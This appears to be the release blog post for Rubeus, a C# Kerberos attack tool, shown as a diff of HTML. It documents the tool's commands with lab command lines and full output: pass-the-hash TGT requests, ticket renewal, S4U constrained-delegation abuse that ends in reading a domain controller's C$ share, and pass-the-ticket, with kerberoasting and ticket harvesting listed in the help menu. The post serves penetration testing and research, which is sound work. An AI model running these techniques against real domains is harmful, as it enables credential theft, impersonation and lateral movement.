@@ -1,0 +1,674 @@
+<p><a href="https://github.com/gentilkiwi/kekeo/"><span style="font-weight: 400;">Kekeo</span></a><span style="font-weight: 400;">, the other big project from </span><a href="https://twitter.com/gentilkiwi/"><span style="font-weight: 400;">Benjamin Delpy</span></a><span style="font-weight: 400;"> after Mimikatz, is an awesome code base with a set of great features. As Benjamin states, it&#8217;s external to the Mimikatz codebase because, </span><a href="https://github.com/comaeio/OPCDE/blob/master/2017/From%20mimikatz%20to%20kekeo%2C%20passing%20by%20new%20Microsoft%20security%20technologies%20-%20Benjamin%20Delpy/OPCDE-2017-From%20Mimikatz%20to%20Kekeo%20Passing%20by%20New%20Microsoft%20Security%20Tech....pdf"><span style="font-weight: 400;">&#8220;</span><i><span style="font-weight: 400;">I hate to code network related stuff ; It uses an external commercial ASN.1 library inside.</span></i><span style="font-weight: 400;">&#8220;</span></a><span style="font-weight: 400;"> Kekeo provides (feature list not complete):</span></p>
+<ul>
+<li style="font-weight: 400;"><span style="font-weight: 400;">The ability to request ticket-granting-tickets (TGTs) from user hashes (rc4_hmac/aes128_cts_hmac_sha1/aes256_cts_hmac_sha1) as well as applying requested TGTs to the current logon session. This provides an alternative to Mimikatz&#8217; &#8220;over-pass-the-hash&#8221; that doesn&#8217;t manipulate LSASS&#8217; memory and doesn&#8217;t require administrative privileges.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">The ability to request service tickets from existing TGTs.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">The only </span><a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/"><span style="font-weight: 400;">S4U constrained delegation abuse</span></a><span style="font-weight: 400;"> (including sname substitution) that I know of outside of Impacket.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Smartcard abuse functions, which I do not fully understand yet : )</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Much more!</span></li>
+</ul>
+<p><span style="font-weight: 400;">So why hasn&#8217;t the pentest industry embraced Kekeo to the same degree as Mimikatz?</span></p>
+<p><figure id="attachment_4682" aria-describedby="caption-attachment-4682" style="width: 1015px" class="wp-caption aligncenter"><a href="https://twitter.com/gentilkiwi/status/1013914776043442177"><img loading="lazy" decoding="async" class="size-large wp-image-4682" src="http://www.harmj0y.net/blog/wp-content/uploads/2018/09/gentilkiwi_kekeo-1015x1024.png" alt="" width="1015" height="1024" srcset="https://blog.harmj0y.net/wp-content/uploads/2018/09/gentilkiwi_kekeo-1015x1024.png 1015w, https://blog.harmj0y.net/wp-content/uploads/2018/09/gentilkiwi_kekeo-150x150.png 150w, https://blog.harmj0y.net/wp-content/uploads/2018/09/gentilkiwi_kekeo-297x300.png 297w, https://blog.harmj0y.net/wp-content/uploads/2018/09/gentilkiwi_kekeo-768x775.png 768w, https://blog.harmj0y.net/wp-content/uploads/2018/09/gentilkiwi_kekeo.png 1208w" sizes="(max-width: 1015px) 100vw, 1015px" /></a><figcaption id="caption-attachment-4682" class="wp-caption-text">https://twitter.com/gentilkiwi/status/1013914776043442177</figcaption></figure></p>
+<p><span style="font-weight: 400;">Part of it is the more nuanced nature of its abuses, but I believe there are two other main reasons. First, Kekeo doesn&#8217;t play super nicely with existing PE-loaders. I tried to get the codebase to work with Invoke-ReflectivePEInjection as well as with  </span><a href="https://twitter.com/subtee"><span style="font-weight: 400;">@subtee</span></a><span style="font-weight: 400;">‘s </span><a href="https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs"><span style="font-weight: 400;">.NET PE loader</span></a><span style="font-weight: 400;">, but I only had limited success. I suspect that others who know more than me in this area could get it working properly but I just wasn&#8217;t that successful.</span></p>
+<p><span style="font-weight: 400;">Second, and related, Kekeo requires a commercial ASN.1 library. ASN.1 is the encoding scheme used in Kerberos traffic, amongst many other places. This means that without a commercial license for the library, it&#8217;s very difficult to modify anything in Kekeo, so most operators are only able to realistically use the precompiled release binaries for Kekeo. These are very likely to be flagged by AV, and combined with the aforementioned modification restrictions and lack of easy usage with PE loaders, most have passed Kekeo by. That&#8217;s unfortunate.</span></p>
+<p><span style="font-weight: 400;">Today I&#8217;m releasing </span><a href="https://github.com/GhostPack/Rubeus/"><span style="font-weight: 400;">Rubeus</span></a><span style="font-weight: 400;">, the start of a C# reimplementation of </span><b>some</b><span style="font-weight: 400;"> (not all) of Kekeo&#8217;s functionality. I’ve wanted to dive deeper into Kerberos structures and exchanges for a while in order to better understand the entire system, and this project provided the perfect excuse to jump right in. </span><b>To be clear</b><span style="font-weight: 400;">: the originator of these techniques and implementations is Benjamin and this is only a reimplementation in another language. The codebase also draws from Benjamin&#8217;s partner in crime, </span><a href="https://twitter.com/mysmartlogon"><span style="font-weight: 400;">Vincent LE TOUX</span></a><span style="font-weight: 400;">, whose little known </span><a href="https://github.com/vletoux/MakeMeEnterpriseAdmin"><span style="font-weight: 400;">MakeMeEnterpriseAdmin</span></a><span style="font-weight: 400;"> project provided some awesome C# LSA-related functions that saved me an enormous amount of time. Huge thanks to both Benjamin and Vincent for trailblazing this area and providing great codebases to work from- without their work this project would absolutely not exist.</span></p>
+<p><span style="font-weight: 400;">I will say though that despite their excellent examples, this is one of the most technically challenging projects I&#8217;ve ever worked on. The ASN.1 library I used is &#8220;raw,&#8221; meaning every Kerberos structure had to be more-or-less implemented by hand. For those who wish to dive into Kerberos structures or ASN.1 parsing, my only warning is &#8220;Here be dragons.&#8221;</span></p>
+<p>Now let&#8217;s get into the fun stuff :)</p>
+<h1>Rubeus</h1>
+<p><span style="font-weight: 400;">Rubeus (named after Rubeus Hagrid, who had to wrangle his own </span><a href="https://vignette.wikia.nocookie.net/harrypotter/images/c/c6/Fluffy_HP1.png/revision/latest?cb=20170925204810"><span style="font-weight: 400;">three-headed dog</span></a><span style="font-weight: 400;">) is a C# version 3.0 (.NET 3.5)-compliant tool to manipulate various components of Kerberos at the traffic and host levels. It </span><span style="font-weight: 400;">uses a C# ASN.1 parsing/encoding library from </span><a href="https://github.com/pornin"><span style="font-weight: 400;">Thomas Pornin</span></a><span style="font-weight: 400;"> named </span><a href="https://github.com/pornin/DDer"><span style="font-weight: 400;">DDer</span></a><span style="font-weight: 400;"> that was released with an &#8220;MIT-like&#8221; license. As mentioned, Kerberos traffic uses ASN.1 encoding for its traffic and finding a usable (and minimal) C# ASN.1 library was a huge challenge. Huge thanks to Thomas for his clean and stable code!</span></p>
+<p>Rubeus has a series of &#8220;actions&#8221;/commands that can be run. If no arguments are supplied, the following help menu is displayed:</p>
+<pre class="lang:default decode:true " title="rubeus_help.txt">   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+
+  Rubeus usage:
+
+    Retrieve a TGT based on a user hash, optionally applying to a specific LUID or creating a /netonly process to apply the ticket to:
+        Rubeus.exe asktgt /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]
+
+    Renew a TGT, optionally autorenewing the ticket up to its renew-till limit:
+        Rubeus.exe renew &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]
+
+    Perform S4U constrained delegation abuse:
+        Rubeus.exe s4u &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
+        Rubeus.exe s4u /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
+
+    Submit a TGT, optionally targeting a specific LUID (if elevated):
+        Rubeus.exe ptt &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/luid:LOGINID]
+
+    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
+        Rubeus.exe purge [/luid:LOGINID]
+
+    Parse and describe a ticket (service ticket or TGT):
+        Rubeus.exe describe &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt;
+
+    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
+        Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]
+
+    Perform Kerberoasting:
+        Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
+
+    Perform Kerberoasting with alternate credentials:
+        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
+
+    Perform AS-REP "roasting" for users without preauth:
+        Rubeus.exe asreproast /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
+
+    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
+        Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
+
+    Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:
+        Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER]
+
+    Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:
+        Rubeus.exe harvest [/interval:MINUTES]
+
+
+  NOTE: Base64 ticket blobs can be decoded with :
+
+      [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))</pre>
+<p><span style="font-weight: 400;">Next, I&#8217;ll walk through every function, explaining the function&#8217;s operational use case and opsec caveats, as well as one or more examples.</span></p>
+<p><span style="font-weight: 400;">Also, as seen above, Rubeus will output tickets as column-wrapped base64-encoded blobs, unless the </span><b>/ptt</b><span style="font-weight: 400;"> option is specified. The easiest way to use these blobs is to copy them into something like Sublime/VS Code, and do a regex search/replace for &#8220;\n    &#8221; to pull everything to a single line. You can then pass the base64 ticket blob(s) to other Rubeus functions, or easily write them out to disk using the following PowerShell command: </span><b>[IO.File]::WriteAllBytes(&#8220;ticket.kirbi&#8221;, [Convert]::FromBase64String(&#8220;aaBASE64bd&#8230;&#8221;))</b><span style="font-weight: 400;">.</span></p>
+<h2>asktgt</h2>
+<p><span style="font-weight: 400;">The </span><b>asktgt</b><span style="font-weight: 400;"> action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (</span><b>/rc4</b><span style="font-weight: 400;"> or </span><b>/aes256</b><span style="font-weight: 400;">). If no </span><b>/domain</b><span style="font-weight: 400;"> is specified, the computer&#8217;s current domain is extracted, and if no </span><b>/dc</b><span style="font-weight: 400;"> is specified the same is done for the system&#8217;s current domain controller using </span><a href="https://docs.microsoft.com/en-us/windows/desktop/api/dsgetdc/nf-dsgetdc-dsgetdcnamea"><span style="font-weight: 400;">DsGetDcName</span></a><span style="font-weight: 400;">. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi file, which includes the user&#8217;s TGT) is output as a base64 blob. The </span><b>/ptt</b><span style="font-weight: 400;"> flag will &#8220;pass-the-ticket&#8221; and apply the resulting Kerberos credential to the current logon session, while the </span><b>/luid:X</b><span style="font-weight: 400;"> flag will apply the ticket to specified logon session (elevation needed.) If </span><b>/createnetonly:X</b><span style="font-weight: 400;"> is specified, </span><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw"><span style="font-weight: 400;">CreateProcessWithLogonW()</span></a><span style="font-weight: 400;"> is used to create a new hidden process (unless </span><b>/show</b><span style="font-weight: 400;"> is specified) with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The requested ticket is then applied to this new logon session.</span></p>
+<p><span style="font-weight: 400;">Operationally, this provides an alternative to Mimikatz&#8217; </span><b>sekurlsa::pth</b><span style="font-weight: 400;"> command, which starts a dummy logon session/process and patches the supplied hash into memory in order to kick off the ticket exchange process underneath. This process attaches to LSASS and manipulates a bit of its memory, which is a possible EDR indicator and also necessitates administrative access.</span></p>
+<p><span style="font-weight: 400;">In our case (or with Kekeo&#8217;s </span><b>tgt::ask</b><span style="font-weight: 400;"> module), since we&#8217;re just sending raw Kerberos traffic to the current or specified domain controller, no elevated privileges are needed on the host. We just need the correct rc4_hmac (</span><b>/rc4</b><span style="font-weight: 400;">) or aes256_cts_hmac_sha1 (</span><b>/aes256</b><span style="font-weight: 400;">) hash for the user for which we&#8217;re requesting the TGT.</span></p>
+<p><span style="font-weight: 400;">Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the </span><b>/ptt</b><span style="font-weight: 400;"> option. A workaround is to use the </span><b>/createnetonly:X</b><span style="font-weight: 400;"> parameter, or request the ticket and apply it to another logon session with </span><b>ptt /luid:X</b><span style="font-weight: 400;">.</span></p>
+<div>
+<pre class="lang:default decode:true" title="asktgt.txt">c:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.0.0
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: 'testlab.local\dfm.a'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 230 bytes
+[*] Received 1537 bytes
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+    doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
+    ...(snip)...
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+
+C:\Rubeus&gt;Rubeus.exe asktgt /user:harmj0y /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /createnetonly:C:\Windows\System32\cmd.exe
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+
+[*] Action: Create Process (/netonly)
+
+[*] Showing process : False
+[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 4988
+[+] LUID            : 6241024
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
+[*] Target LUID : 6241024
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: 'testlab.local\harmj0y'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 232 bytes
+[*] Received 1405 bytes
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFFjCCBRKgAwIB...(snip)...
+
+[*] Action: Import Ticket
+[*] Target LUID: 0x5f3b00
+[+] Ticket successfully imported!
+</pre>
+<p><span style="font-weight: 400;">If the </span><b>/ptt</b><span style="font-weight: 400;"> function wasn&#8217;t specified to import the ticket into the current logon session, you can use the Rubeus </span><b>ptt</b><span style="font-weight: 400;"> command (documented in this post), the Mimikatz </span><b>kerberos::ptt</b><span style="font-weight: 400;"> function, or Cobalt Strike&#8217;s </span><b>kerberos_ticket_use</b><span style="font-weight: 400;"> to apply the ticket later.</span></p>
+<p><b>Note that the /luid and /createnetonly parameters require elevation!</b></p>
+<h2>renew</h2>
+<p><span style="font-weight: 400;">The default Kerberos policy for most domains gives TGTs a 10 hour lifetime with a 7 day renewal window. So what exactly does this mean?</span></p>
+<p><span style="font-weight: 400;">The tickets imported into LSASS for a user are not </span><b>just</b><span style="font-weight: 400;"> TGTs- they are</span><a href="https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/KerberosV5Spec2.asn#L305-L310"> <span style="font-weight: 400;">KRB-CRED structures</span></a><span style="font-weight: 400;"> (.kirbi files in Mimikatz language) which include the user&#8217;s TGT (encrypted with the krbtgt Kerberos service signing key) and an</span><a href="https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/KerberosV5Spec2.asn#L314-L321"> <span style="font-weight: 400;">EncKrbCredPart</span></a><span style="font-weight: 400;"> which includes a sequence of one or more </span><a href="https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/KerberosV5Spec2.asn#L323-L335"><span style="font-weight: 400;">KrbCredInfo</span></a><span style="font-weight: 400;"> structures. These final structures include a</span><a href="https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/KerberosV5Spec2.asn#L324"> <span style="font-weight: 400;">session key</span></a><span style="font-weight: 400;"> that was returned by the TGT request (AS-REQ/AS-REP). This session key is used in combination with the opaque TGT blob when requesting additional resources. The session key is only good for a (by default) 10 hour lifetime, but the TGT can be renewed for up to 7 total days (by default) to receive a new session key and therefore usable KRB-CRED structures.</span></p>
+<p><span style="font-weight: 400;">So if you have a .kirbi file (or associated Rubeus base64 blob) that is within its 10 hour valid lifetime and is under its 7 day renewal window, you can use Kekeo or Rubeus to renew the TGT to restart the 10 hour window and extend the useful lifetime of the credential.</span></p>
+<p><span style="font-weight: 400;">The </span><b>renew</b><span style="font-weight: 400;"> action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified </span><b>/ticket:X</b><span style="font-weight: 400;"> supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a </span><b>/dc</b><span style="font-weight: 400;"> is not specified, the computer&#8217;s current domain controller is extracted and used as the destination for the renewal traffic. The </span><b>/ptt</b><span style="font-weight: 400;"> flag will &#8220;pass-the-ticket&#8221; and apply the resulting Kerberos credential to the current logon session.</span></p>
+</div>
+<div>
+<pre class="lang:default decode:true" title="renew1.txt">c:\Rubeus&gt;Rubeus.exe renew /ticket:doIFmjCC...(snip)...
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.0.0
+
+[*] Action: Renew TGT
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\dfm.a'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1500 bytes
+[*] Received 1510 bytes
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+    doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
+    ...(snip)...</pre>
+<p><span style="font-weight: 400;">If you want the ticket to auto-renew up until the ticket&#8217;s renewal limit, just use the </span><b>/autorenew</b><span style="font-weight: 400;"> parameter:</span></p>
+<pre class="lang:default decode:true " title="autorenew.txt">C:\Rubeus&gt;Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+[*] Action: Auto-Renew TGT
+
+
+[*] User       : harmj0y@TESTLAB.LOCAL
+[*] endtime    : 9/24/2018 3:34:05 AM
+[*] renew-till : 9/30/2018 10:34:05 PM
+[*] Sleeping for 165 minutes (endTime-30) before the next renewal
+[*] Renewing TGT for harmj0y@TESTLAB.LOCAL
+
+[*] Action: Renew TGT
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\harmj0y'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1370 bytes
+[*] Received 1378 bytes
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIFFjCCBRKg...(snip)...
+
+
+[*] User       : harmj0y@TESTLAB.LOCAL
+[*] endtime    : 9/24/2018 8:03:55 AM
+[*] renew-till : 9/30/2018 10:34:05 PM
+[*] Sleeping for 269 minutes (endTime-30) before the next renewal
+[*] Renewing TGT for harmj0y@TESTLAB.LOCAL</pre>
+</div>
+<div>
+<p><span style="font-weight: 400;">To take this one step further, check out Rubeus’ </span><b>harvest</b><span style="font-weight: 400;"> function, which will harvest TGTs on a system and auto-renew any TGTs up until their renewal window.</span></p>
+<h2><b>s4u</b></h2>
+<p><span style="font-weight: 400;">Constrained delegation is a difficult topic to explain in depth, and a paragraph here won&#8217;t do it justice. For more background, check out my </span><a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/"><span style="font-weight: 400;">S4U2Pwnage</span></a><span style="font-weight: 400;"> post and associated resources. This Rubeus action is nearly identical to Kekeo&#8217;s </span><b>tgs::s4u</b><span style="font-weight: 400;"> function. Constrained delegation configurations are also now an</span><a href="https://posts.specterops.io/bloodhound-2-0-bc5117c45a99"> <span style="font-weight: 400;">edge that BloodHound 2.0 collects</span></a><span style="font-weight: 400;">.</span></p>
+<p><span style="font-weight: 400;">But as a tl;dr, if a user or computer account has a service principal name (SPN) set in its msds-allowedToDelegateto field and an attacker can compromise said user/computer&#8217;s account hash, that attacker can pretend to be ANY domain user to ANY service on the targeted host.</span></p>
+<p><span style="font-weight: 400;">To abuse this TTP, first a valid TGT/KRB-CRED file is needed for the account with constrained delegation configured. This can be achieved with the </span><b>asktgt</b><span style="font-weight: 400;"> action, given the NTLM/RC4 or the aes256_cts_hmac_sha1 hash of the account. </span><span style="font-weight: 400;">The ticket is then supplied to the </span><b>s4u</b><span style="font-weight: 400;"> action via </span><b>/ticket</b><span style="font-weight: 400;"> (again, either as a base64 blob or a ticket file on disk), along with a required </span><b>/impersonateuser:X</b><span style="font-weight: 400;"> to impersonate to the </span><b>/msdsspn:SERVICE/SERVER</b><span style="font-weight: 400;"> SPN that is configured in the account&#8217;s msds-allowedToDelegateTo field. The </span><b>/dc</b><span style="font-weight: 400;"> and </span><b>/ptt</b><span style="font-weight: 400;"> parameters function the same as in previous actions.</span></p>
+<p><span style="font-weight: 400;">The /</span><b>altservice</b><span style="font-weight: 400;"> parameter takes advantage of</span><a href="https://twitter.com/agsolino"> <span style="font-weight: 400;">Alberto Solino</span></a><span style="font-weight: 400;">&#8216;s great discovery about how the</span><a href="https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more"> <span style="font-weight: 400;">service name (sname) is not protected in the KRB-CRED file</span></a><span style="font-weight: 400;">, only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file.</span></p>
+</div>
+<div>
+<pre class="lang:default decode:true " title="s4u.txt">c:\Temp\tickets&gt;Rubeus.exe asktgt /user:patsy /domain:testlab.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 602f5c34346bc946f9ac2c0922cd9ef6
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: 'testlab.local\patsy'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 230 bytes
+[*] Received 1377 bytes
+[*] base64(ticket.kirbi):
+
+      doIE+jCCBPagAwIBBaE...(snip)...
+
+c:\Temp\tickets&gt;Rubeus.exe s4u /ticket:C:\Temp\Tickets\patsy.kirbi /impersonateuser:dfm.a /msdsspn:ldap/primary.testlab.local /altservice:cifs /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+[*] Action: S4U
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2self request for: 'TESTLAB.LOCAL\patsy'
+[*]   Impersonating user 'dfm.a' to target SPN 'ldap/primary.testlab.local'
+[*]   Final ticket will be for the alternate service 'cifs'
+[*] Sending S4U2self request
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1437 bytes
+[*] Received 1574 bytes
+[+] S4U2self success!
+[*] Building S4U2proxy request for service: 'ldap/primary.testlab.local'
+[*] Sending S4U2proxy request
+[*] Connecting to 192.168.52.100:88
+[*] Sent 2618 bytes
+[*] Received 1798 bytes
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'cifs'
+[*] base64(ticket.kirbi):
+
+      doIGujCCBragAwIBBaEDAgE...(snip)...
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!</pre>
+</div>
+<div>
+<div><span style="font-weight: 400;">Alternatively, instead of providing a </span><b>/ticket</b><span style="font-weight: 400;">, a </span><b>/user:X</b><span style="font-weight: 400;"> and either a </span><b>/rc4:X</b><span style="font-weight: 400;"> or </span><b>/aes256:X</b><span style="font-weight: 400;"> hash specification (</span><b>/domain:X</b><span style="font-weight: 400;"> optional) can be used similarly to the </span><b>asktgt</b><span style="font-weight: 400;"> action to first request a TGT for </span><b>/user</b><span style="font-weight: 400;"> with constrained delegation configured, which is then used for the s4u exchange.</span></div>
+</div>
+<div>
+<pre class="lang:default decode:true" title="s4u2.txt">C:\Temp\tickets&gt;dir \\primary.testlab.local\C$
+The user name or password is incorrect.
+
+C:\Temp\tickets&gt;Rubeus.exe s4u /user:patsy /domain:testlab.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6 /impersonateuser:dfm.a /msdsspn:LDAP/primary.testlab.local /altservice:cifs /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.0.0
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 602f5c34346bc946f9ac2c0922cd9ef6
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: 'testlab.local\patsy'
+[*] Connecting to 192.168.52.100:88
+[*] Sent 230 bytes
+[*] Received 1377 bytes
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIE+jCCBPagAwIBBaEDAg...(snip)...
+
+[*] Action: S4U
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2self request for: 'TESTLAB.LOCAL\patsy'
+[*]   Impersonating user 'dfm.a' to target SPN 'LDAP/primary.testlab.local'
+[*]   Final ticket will be for the alternate service 'cifs'
+[*] Sending S4U2self request
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1437 bytes
+[*] Received 1574 bytes
+[+] S4U2self success!
+[*] Building S4U2proxy request for service: 'LDAP/primary.testlab.local'
+[*] Sending S4U2proxy request
+[*] Connecting to 192.168.52.100:88
+[*] Sent 2618 bytes
+[*] Received 1798 bytes
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'cifs'
+[*] base64(ticket.kirbi):
+
+      doIGujCCBragAwIBBaE...(snip)...
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\Temp\tickets&gt;dir \\primary.testlab.local\C$
+ Volume in drive \\primary.testlab.local\C$ has no label.
+ Volume Serial Number is A48B-4D68
+
+ Directory of \\primary.testlab.local\C$
+
+03/05/2017  05:36 PM    &lt;DIR&gt;          inetpub
+08/22/2013  08:52 AM    &lt;DIR&gt;          PerfLogs
+04/15/2017  06:25 PM    &lt;DIR&gt;          profiles
+08/28/2018  12:51 PM    &lt;DIR&gt;          Program Files
+08/28/2018  12:51 PM    &lt;DIR&gt;          Program Files (x86)
+08/23/2018  06:47 PM    &lt;DIR&gt;          Temp
+08/23/2018  04:52 PM    &lt;DIR&gt;          Users
+08/23/2018  06:48 PM    &lt;DIR&gt;          Windows
+               8 Dir(s)  40,679,706,624 bytes free</pre>
+</div>
+<h2>ptt</h2>
+<div>
+<p><span style="font-weight: 400;">The Rubeus </span><b>ptt</b><span style="font-weight: 400;"> command is fairly simple: it will submit a ticket (TGT or service ticket .kirbi) for the current logon session through the</span><a href="https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage"> <span style="font-weight: 400;">LsaCallAuthenticationPackage()</span></a><span style="font-weight: 400;"> API with a KERB_SUBMIT_TKT_REQUEST message, or (if elevated) to the logon session specified by </span><b>/luid:X</b><span style="font-weight: 400;">. This is the same functionality as Mimikatz&#8217; </span><b>kerberos::ptt</b><span style="font-weight: 400;"> function. </span><span style="font-weight: 400;">Like other Rubeus </span><b>/ticket:X</b><span style="font-weight: 400;"> parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.</span></p>
+</div>
+<div>
+<pre class="lang:default decode:true" title="ptt.txt">c:\Rubeus&gt;Rubeus.exe ptt /ticket:doIFmj...(snip)...
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.0.0
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!</pre>
